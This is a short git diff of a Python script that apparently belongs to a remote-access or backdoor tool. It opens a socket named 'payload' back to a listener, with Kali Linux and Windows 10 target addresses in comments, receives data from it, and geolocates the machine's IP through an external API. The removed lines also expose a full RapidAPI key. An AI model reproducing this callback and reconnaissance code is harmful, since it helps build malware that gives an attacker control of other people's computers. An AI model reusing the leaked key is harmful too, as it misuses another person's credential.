@@ -22,8 +22,8 @@ os.system("color")
 
 
 payload = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-#payload.connect(("127.0.0.1", 80)) #Kali Linux
-payload.connect(("192.168.56.1", 80)) #Win 10
+payload.connect(("127.0.0.1", 80)) #Kali Linux
+#payload.connect(("172.20.60.62", 80)) #Win 10
 
 def recv_data():
     original_size = payload.recv(2048).decode('utf-8')
@@ -46,11 +46,13 @@ def get_ip():
     return ip
 
 def geo():
+    with open('api.txt', 'r') as f:
+        api = f.readline() 
     url = "https://ip-geo-location.p.rapidapi.com/ip/check"
     querystring = {"format":"json"}
     headers = {
         "X-RapidAPI-Host": "ip-geo-location.p.rapidapi.com",
-        "X-RapidAPI-Key": "32817552b9msh76d99ce4ae9c87fp1520f9jsn63fc1b2efaa1"
+        "X-RapidAPI-Key": api
     }
     response = requests.request("GET", url, headers=headers, params=querystring)
 
